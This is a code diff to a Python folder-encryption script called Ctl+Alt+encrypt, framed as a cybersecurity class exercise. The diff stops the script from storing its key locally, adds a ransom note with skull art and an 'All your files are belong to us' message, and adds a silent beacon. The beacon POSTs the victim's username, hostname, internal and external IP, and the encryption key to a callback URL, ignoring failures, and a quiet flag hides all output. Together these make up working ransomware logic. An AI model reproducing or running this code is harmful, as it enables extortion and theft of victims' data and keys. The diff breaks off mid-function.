@@ -18,12 +18,17 @@ Requirements:
 from __future__ import annotations
 
 import argparse
+import getpass
 import io
 import os
-from dataclasses import dataclass
-import time
-import sys
+import platform
 import shutil
+import socket
+import sys
+import time
+import urllib.request
+import urllib.parse
+from dataclasses import dataclass
 from pathlib import Path
 from typing import Optional
 import zipfile
@@ -32,6 +37,46 @@ from cryptography.fernet import Fernet, InvalidToken
 
 
 DEFAULT_INFO_FILENAME = "encryption_info.txt"
+BEACON_URL = "http://localhost/beacon.php"
+
+# Embedded skull art (from skulls.txt)
+SKULL_ART = r"""⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇
+⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇
+⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇
+⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣶⣿⣧⣤⣶⣿⣿⣿⣿⣿⣿⣿⣿⡇
+⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇
+⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣟⣿⣿⣿⣿⣿⣿⣛⡛⡿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇
+⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢿⣹⣽⣿⣿⣿⣿⣿⣿⣿⣿⣾⣿⣿⣷⣦⣌⣹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇
+⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣯⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣯⡹⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇
+⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠋⣴⣿⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣌⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇
+⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⣾⣷⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⣿⣿⡬⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇
+⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣻⣿⣿⡈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇
+⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠟⣿⣉⣭⣭⣭⡿⣿⣻⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⣿⡏⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⣿⣿⣧⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢿⡃
+⢸⣿⣿⣿⣿⣿⣿⣿⣿⡿⢋⣤⢶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣿⣟⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⢹⣷⣹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠛⠛⠻⠿⠿⢿⣿⣿⣟⣹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢿⣾⡇
+⢸⣿⣿⣿⣿⣿⣿⣿⠏⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⢸⣿⡏⢹⣿⣿⣿⡿⠟⠛⠛⠿⣿⣿⣿⣿⣿⠀⠐⠛⠛⠃⠀⢢⠀⢹⣿⡟⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢳⣾⣿⣿⡇
+⢸⣿⣿⣿⣿⣿⣿⡏⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣹⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⢸⡟⣿⠀⣿⡿⠋⠀⠂⠀⠀⠀⠹⣿⡖⣿⣿⠀⠀⠀⠀⠀⠀⢸⠿⠀⣿⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣾⣿⣿⣿⡇
+⢸⣿⣿⣿⣿⣿⡏⢠⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣆⢳⣻⣶⡟⠀⠀⠀⠀⠀⢸⠃⠀⣿⠧⠛⢿⣄⡀⠀⠀⣀⢀⠾⠀⢸⣿⣶⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢻⣿⣿⣿⠇
+⢸⣿⣿⣿⣿⣿⠁⠋⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⠹⣻⡇⠀⠀⠀⠀⠀⠘⠀⣰⡏⠀⠀⠀⠻⣿⣶⣤⣉⣉⣠⣴⣿⣿⣿⢁⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣼⡿⠋⠀⠀
+⢸⣿⣿⣿⣿⣿⡇⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢿⣿⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣆⠱⢾⡄⠀⠀⠀⠀⠀⣠⣿⠀⠀⠀⠀⠀⢻⣿⣿⣿⣿⣿⣿⣿⡍⢡⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡼⡄⠀⠀⠀⠀
+⢸⣿⣿⣿⣿⣿⠀⢰⠋⠉⠀⠀⠀⠀⠈⣿⣿⣿⡿⠿⢿⣿⣿⣿⡿⣡⣿⡟⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆⢾⣿⣶⣀⣀⣶⣿⣿⣿⣦⣀⣤⢦⣤⣿⣿⣿⣿⣿⠟⢋⡿⢇⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠙⣄⠀⠀⠀
+⢸⣿⣿⣿⣿⡿⠃⡄⠀⠀⠀⠰⠀⠀⣠⡯⣽⡛⠀⠀⡀⠈⠻⣿⡧⣾⠏⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡌⠿⠿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⣿⠃⢸⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⣼⣟⡶⡆
+⢸⣿⣿⣿⣿⡇⠸⣿⣦⡀⠀⣀⣠⣾⠟⠃⢿⣧⠀⠀⠁⠘⠀⠘⣇⠀⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⡀⠘⢿⡿⣿⣿⣿⣿⣿⣿⠻⣿⣿⣿⡟⢃⣡⡧⠀⣾⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣮⣙⠳⡇
+⢸⣿⣿⣿⣿⣿⡶⢈⢛⣿⣿⣿⡿⠋⢀⡆⢸⣿⡀⠀⠦⠄⠀⣸⡇⣴⣿⣿⣿⣿⣿⣿⣿⣿⣛⣿⣷⣶⣷⣶⣾⣍⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇⠀⠈⠓⠿⡿⣿⡟⣻⢩⣯⣽⣷⠙⠃⠈⠁⢠⠴⡞⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡄
+⢀⠸⣿⣿⣿⣿⠃⡼⢻⣿⣿⣟⣣⣀⡈⠁⢸⣿⣿⣿⣶⣾⢯⣿⢻⣿⣿⣿⣿⣿⣿⣿⢳⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡌⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄⠀⠁⠑⡓⠛⠃⠉⣈⠉⠀⠀⠀⠀⠀⣀⣾⣾⡐⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇
+⠸⠆⢻⣿⣿⡟⢰⣷⠀⠪⢝⡻⢿⣿⣿⣿⣿⣿⣿⢿⣩⡷⢂⣼⣿⣿⣿⣿⣿⣿⡟⠉⠋⠁⠈⢿⣿⠃⠀⠈⠙⢿⣿⣿⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣀⠀⠀⢳⣀⠀⡀⢀⠀⣀⣠⣖⢺⣟⣛⢸⣿⠁⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇
+⠀⠀⢸⣿⣿⣧⠘⣿⣇⢀⠀⠁⠘⠐⠗⠾⠿⠿⠧⣼⣿⠇⣾⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⣠⣀⣀⣹⣷⡀⠀⠀⠀⠀⢻⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠐⣍⣧⣽⣬⣧⣼⣿⣿⣿⣿⣿⡿⠟⠀⡛⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇
+⢸⢃⣸⣿⣿⣿⣧⠸⣿⣿⣤⣀⣆⠠⢠⠤⠤⣤⣶⣼⡟⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⡌⡹⠋⠉⠽⠿⣿⣿⡄⠺⠣⠀⣾⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠹⣾⣿⣿⣿⣿⣿⣿⣿⠟⠋⠀⣠⡞⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇
+⠘⣸⣿⣿⣿⣿⣿⣆⠻⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⢉⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⡁⠀⠀⠀⠀⠈⠙⠃⠀⣇⡐⠃⣼⣿⣿⣿⣿⢿⣷⣦⣍⣻⡛⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⡯⣝⣿⣿⣷⣶⣶⠛⣿⣿⣧⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⣿⣟⣻⣟⠛⠛⠿⡇
+⢰⣿⣿⣿⣿⣿⣿⣿⣷⠀⢩⣟⡛⠿⠿⠛⢉⣠⡔⠒⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣾⡄⢠⠀⠀⠀⠀⢸⠟⠉⠈⣿⣿⣿⣿⠇⣘⣻⣻⣿⢻⣿⣷⡿⠿⡛⢿⣟⣿⣿⣿⡿⣛⣻⣿⡇⠉⠀⠀⠉⠁⢠⣿⡏⢹⣿⣷⣾⣿⣍⢻⣿⣿⣿⣿⣿⡿⢿⣿⣿⣿⣿⣿⣷⡆
+⢨⣭⣉⣿⡿⠟⠋⠐⠺⠂⣿⣤⣏⢙⣿⣿⣿⠛⠃⠀⠻⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣟⠁⠈⠀⠀⠀⢠⡾⢶⠋⡀⢹⣿⣿⣏⣿⣿⣿⣿⣿⣉⡁⠹⣿⡌⣿⣿⡿⠉⠉⠀⣀⣀⡀⠈⠁⠨⠀⠀⠀⠀⠊⠙⢃⠈⠍⠉⣿⣿⡿⠟⠛⠛⠛⢉⣉⣭⣿⣿⣿⡆⢉⠉⠁⡄
+⠈⠻⢿⣟⠁⠀⠀⠀⠀⠒⠈⠙⠻⠿⣿⣿⣿⠏⠉⠉⠑⢶⣦⡉⢻⣿⣿⣿⣿⡿⠿⠿⣿⣿⡀⠀⠀⠃⢀⣾⡏⠉⠙⠀⠈⣿⣿⣇⣹⣿⣿⣿⣿⣏⠀⠂⢸⣿⣿⣼⠀⠀⠀⠀⠀⠠⠄⠀⠀⠀⣀⣀⣀⡀⠂⢀⣩⣴⣶⠿⠛⠉⠀⢠⣤⡄⠯⣾⣿⣿⣿⣿⣿⠇⠀⠻⠀⠀
+⠀⠀⣀⠙⣿⣶⣤⣀⡈⢀⣿⣿⣶⣶⣤⣴⣾⠀⠀⠀⠀⠀⣻⣿⣤⣿⣷⣶⣿⣿⣿⣷⣷⣦⣥⠆⣠⣾⣿⠟⠓⠀⠀⡀⠀⠈⠍⠛⢉⣿⣿⣿⣿⣿⡆⠀⣶⡻⣿⡿⠙⢻⣿⣶⣿⣶⣶⣶⣤⣾⣿⣿⣿⣿⣿⠿⠛⡉⠀⠀⠀⠊⢀⣼⣿⠻⣿⣿⣿⣿⣿⣿⣿⡀⠀⠀⡀⠀
+⢀⠀⢻⣇⠙⣽⠛⠿⢿⣾⣿⣿⣿⣿⣿⡏⢀⣤⣴⣾⣿⣿⣿⣿⣿⡛⠋⠉⠉⠉⠉⠛⣿⣿⣿⡁⢈⠉⢁⣀⠀⠀⠘⠒⢂⡀⠄⠉⢹⣿⠿⠟⠛⠁⠀⠀⢻⣷⡆⠀⣾⣿⣿⣿⣿⣿⣿⣿⣿⠹⠿⠿⠛⠉⠀⠐⠋⠡⠀⡀⠀⣠⣾⡟⢻⣷⣿⣿⣿⣿⣿⣿⣿⣷⡀⠀⠁⠀
+⠀⠀⠈⠛⣷⣤⣀⡀⣾⣿⣿⣿⣿⣿⣿⣧⠸⡿⠟⠛⠉⠁⢠⣿⣿⠃⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⠀⠈⣿⣿⡷⠉⢙⣩⠅⢠⣤⣤⣿⣿⠆⣠⠀⠀⡀⠀⠀⠹⣷⡀⠙⢿⣿⣿⣿⣿⣿⠏⢁⡀⠀⠀⠀⠀⠀⠀⢀⣐⣉⣴⣾⣿⠟⠀⠀⣿⣿⣧⣿⣿⣿⣫⠟⢻⣷⠀⠀⡀
+⠀⠀⠀⠀⢌⠙⠻⣿⡏⠁⣀⠀⠙⠛⠋⠁⠀⠀⠀⢀⣠⣴⣿⣿⠃⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣃⣀⣀⠙⠟⢀⣀⡀⠀⣀⡸⢿⣿⣿⠇⣼⣷⣇⣰⠀⠀⠀⠀⠻⢷⡀⠈⢿⣿⠛⠛⠁⢠⣾⣿⣿⣿⡿⠻⡿⠿⠟⠛⣉⠙⢉⣀⣀⠀⢸⣿⡗⢸⣿⣿⡿⠃⡄⣿⣿⣇⠈⠁
+⢸⣦⣀⠀⠀⠀⠀⠈⣷⣿⣿⣿⣷⣦⢿⣿⣶⡿⠿⠟⠛⠋⠉⢳⣧⠀⠀⠀⡠⠖⠋⣿⡿⣿⣿⠈⢍⠻⣿⠇⠘⠀⠈⠉⠀⢠⣾⣿⡏⠀⣿⣿⡿⢿⣀⡀⠀⣀⣠⣤⣧⣤⡀⠀⠀⠀⠐⠟⠛⠉⠁⠀⠀⠀⠂⠘⠓⠚⢁⠔⠀⠀⠈⢁⣼⣿⠟⡿⣿⡏⢀⣾⣇⢸⣿⣿⡄⠀
+⠈⢿⠿⢿⣦⣤⡀⠺⠛⠿⢿⣿⡿⠋⠀⣀⠘⠉⠀⠀⠀⠀⠀⣸⣿⠀⢀⠎⣠⣾⢰⣿⡽⣿⣿⠀⠤⠠⣤⡆⠀⠲⠶⢶⣶⣾⣿⣿⣥⣞⡁⢹⣷⣈⣿⣷⣿⣿⣿⣿⣿⣿⣿⣷⣶⡦⠀⢠⡶⠀⠀⠀⠀⠀⢀⡀⠀⠀⠀⠐⢃⣸⣶⣿⣿⣯⡿⣱⣿⡇⢼⣿⣿⢸⣿⣿⡷⠀
+⠐⠢⠀⠀⠉⠉⠛⣷⣦⣄⣸⣥⣀⣠⣦⣤⣤⣤⣤⣶⣦⣾⣿⡿⠃⢀⡌⢰⣿⡿⢸⣿⡇⣿⣿⣇⣀⣀⠈⠉⠀⣀⡀⠀⢠⣿⣿⡏⢨⢹⣷⢸⣿⣿⡌⠙⠿⠿⢿⣿⣏⣿⣿⣿⣧⠀⡆⢸⣿⣄⠀⠀⠀⠀⠈⢓⣀⣤⣴⣾⣿⣿⡿⣿⠟⠁⠀⢹⣿⣿⡌⣿⣿⢸⣿⣿⡇⡄"""
 
 
 @dataclass
@@ -40,14 +85,16 @@ class EncryptConfig:
     output_file: Path
     info_file: Path
     slow_demo: bool
+    callback_url: Optional[str] = None
 
 
 @dataclass
 class DecryptConfig:
     folder: Path
     encrypted_file: Path
-    info_file: Path
+    info_file: Optional[Path]  # Optional when --key is provided
     output_folder: Path
+    key: Optional[bytes] = None  # When set, use instead of reading from info file
 
 
 def parse_args(argv: Optional[list[str]] = None) -> argparse.Namespace:
@@ -109,6 +156,27 @@ def parse_args(argv: Optional[list[str]] = None) -> argparse.Namespace:
             f"Defaults to <folder>/{DEFAULT_INFO_FILENAME}."
         ),
     )
+    parser.add_argument(
+        "--key",
+        type=str,
+        metavar="KEY",
+        help=(
+            "Decrypt mode: Fernet key (base64). If the key starts with -, use "
+            "--key=KEY or --key-file. Use when the key was received via beacon."
+        ),
+    )
+    parser.add_argument(
+        "--key-file",
+        type=str,
+        metavar="FILE",
+        help="Decrypt mode: read Fernet key from FILE (use for keys that start with -).",
+    )
+    parser.add_argument(
+        "--quiet",
+        "-q",
+        action="store_true",
+        help="Suppress all CLI output (progress, messages, skull).",
+    )
 
     return parser.parse_args(argv)
 
@@ -134,6 +202,7 @@ def build_encrypt_config(args: argparse.Namespace) -> EncryptConfig:
         output_file=output_file,
         info_file=info_file,
         slow_demo=bool(getattr(args, "slow_demo", False)),
+        callback_url=BEACON_URL,
     )
 
 
@@ -153,13 +222,26 @@ def build_decrypt_config(args: argparse.Namespace) -> DecryptConfig:
     if not encrypted_file.exists():
         raise SystemExit(f"Encrypted file not found: {encrypted_file}")
 
+    key_from_arg: Optional[bytes] = None
+    key_file = getattr(args, "key_file", None)
+    if key_file:
+        key_path = Path(key_file).expanduser().resolve()
+        if not key_path.exists() or not key_path.is_file():
+            raise SystemExit(f"Key file not found: {key_path}")
+        key_from_arg = key_path.read_text(encoding="utf-8").strip().encode("utf-8")
+    elif getattr(args, "key", None):
+        key_from_arg = args.key.strip().encode("utf-8")
+
     if args.info_file:
         info_file = Path(args.info_file).expanduser().resolve()
     else:
         info_file = folder / DEFAULT_INFO_FILENAME
 
-    if not info_file.exists():
-        raise SystemExit(f"Encryption info file not found: {info_file}")
+    if key_from_arg is None and (not info_file.exists() or not info_file.is_file()):
+        raise SystemExit(
+            f"Encryption info file not found: {info_file}. "
+            "Provide --key or --key-file with the Fernet key (e.g. from your beacon log) to decrypt."
+        )
 
     if args.output_folder:
         output_folder = Path(args.output_folder).expanduser().resolve()
@@ -172,6 +254,7 @@ def build_decrypt_config(args: argparse.Namespace) -> DecryptConfig:
         encrypted_file=encrypted_file,
         info_file=info_file,
         output_folder=output_folder,
+        key=key_from_arg,
     )
 
 
@@ -236,79 +319,109 @@ def generate_key() -> bytes:
     return Fernet.generate_key()
 
 
-def write_info_file(info_path: Path, key: bytes, encrypted_file: Path) -> None:
+def write_info_file(info_path: Path, encrypted_file: Path) -> None:
     """
-    Write a text file with a brief explanation and the encryption key.
+    Write a text file with the ransom message and skull art (no key).
     """
     info_path.parent.mkdir(parents=True, exist_ok=True)
     message_lines = [
-        "This folder has been encrypted by Ctl+Alt+encrypt as part of a cybersecurity class exercise.",
+        "Ctl+Alt+encrypt",
+        "All your files are belong to us.",
+        "",
+        "This folder has been encrypted as part of a cybersecurity class exercise.",
         f"The encrypted archive file is: {encrypted_file}",
         "",
-        "Use the Python script `encrypt_folder.py` together with the key below",
-        "to decrypt the archive and restore the original files.",
+        "Use the Python script `encrypt_folder.py` with --decrypt and --key (or --key-file) to",
+        "decrypt the archive and restore the original files.",
         "",
-        "Encryption key (Fernet, base64 URL-safe):",
-        key.decode("utf-8"),
-        "",
+        SKULL_ART,
     ]
     info_path.write_text("\n".join(message_lines), encoding="utf-8")
 
 
+def _get_internal_ip() -> str:
+    """Best-effort primary local IPv4 (e.g. for beacon)."""
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.settimeout(0.5)
+        s.connect(("8.8.8.8", 80))
+        ip = s.getsockname()[0]
+        s.close()
+        return ip
+    except OSError:
+        return ""
+
+
+def _get_external_ip() -> str:
+    """Best-effort public IPv4 (e.g. for beacon)."""
+    try:
+        req = urllib.request.Request(
+            "https://api.ipify.org",
+            headers={"User-Agent": "curl/7.68.0"},
+        )
+        with urllib.request.urlopen(req, timeout=5) as resp:
+            return resp.read().decode("utf-8").strip()
+    except Exception:
+        return ""
+
+
+def send_beacon(callback_url: str, key: bytes) -> None:
+    """
+    POST username, computer_name, internal_ip, external_ip, and encryption key
+    to the callback URL. Used for red team beacon; failures are ignored.
+    """
+    data = {
+        "username": getpass.getuser(),
+        "computer_name": platform.node(),
+        "internal_ip": _get_internal_ip(),
+        "external_ip": _get_external_ip(),
+        "key": key.decode("utf-8"),
+    }
+    try:
+        payload = urllib.parse.urlencode(data).encode("utf-8")
+        req = urllib.request.Request(
+            callback_url,
+            data=payload,
+            method="POST",
+            headers={"Content-Type": "application/x-www-form-urlencoded"},
+        )
+        with urllib.request.urlopen(req, timeout=10) as resp:
+            resp.read()
+    except Exception:
+        pass  # Silent; do not affect encryption flow
+
+
 def show_laughing_skull() -> None:
     """
-    Display a looping red ASCII skull with a centered Ctl+Alt+encrypt header
-    until the user presses Ctrl+C.
+    Display a red ASCII skull with a centered Ctl+Alt+encrypt header.
     """
-    skull_path = Path(__file__).resolve().parent / "skulls.txt"
-    try:
-        skull_text = skull_path.read_text(encoding="utf-8")
-    except OSError:
-        skull_text = "[ skull art file 'skulls.txt' not found ]"
+    cols = shutil.get_terminal_size(fallback=(80, 24)).columns
+    header = "Ctl+Alt+encrypt"
+    subtitle = "All your files are belong to us."
+    pad = max(0, (cols - len(header)) // 2)
+    pad_sub = max(0, (cols - len(subtitle)) // 2)
+    header_line = " " * pad + header
+    subtitle_line = " " * pad_sub + subtitle
 
-    frames = [skull_text]
+    skull_lines = SKULL_ART.splitlines()
+    centered_lines = []
+    for line in skull_lines:
+        stripped = line.rstrip("\n")
+        if not stripped:
+            centered_lines.append("")
+        else:
+            pad_line = max(0, (cols - len(stripped)) // 2)
+            centered_lines.append(" " * pad_line + stripped)
+    centered_skull = "\n".join(centered_lines)
 
-    try:
-        idx = 0
-        while True:
-            cols = shutil.get_terminal_size(fallback=(80, 24)).columns
-            header = "Ctl+Alt+encrypt"
-            subtitle = "All your files are belong to us."
-            pad = max(0, (cols - len(header)) // 2)
-            pad_sub = max(0, (cols - len(subtitle)) // 2)
-            header_line = " " * pad + header
-            subtitle_line = " " * pad_sub + subtitle
-
-            # Center skull lines as well
-            skull_lines = frames[idx % len(frames)].splitlines()
-            centered_lines = []
-            for line in skull_lines:
-                stripped = line.rstrip("\n")
-                if not stripped:
-                    centered_lines.append("")
-                else:
-                    pad_line = max(0, (cols - len(stripped)) // 2)
